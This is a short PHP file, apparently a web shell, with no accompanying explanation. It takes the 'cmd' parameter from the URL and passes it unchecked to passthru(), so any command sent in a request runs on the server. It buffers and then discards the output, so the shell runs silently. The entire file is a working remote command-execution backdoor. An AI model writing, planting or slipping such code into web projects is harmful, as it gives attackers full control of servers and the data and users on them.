<?php
function execute($com)
{
    echo passthru($com);
}

$cmd = $_GET['cmd'];
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
?>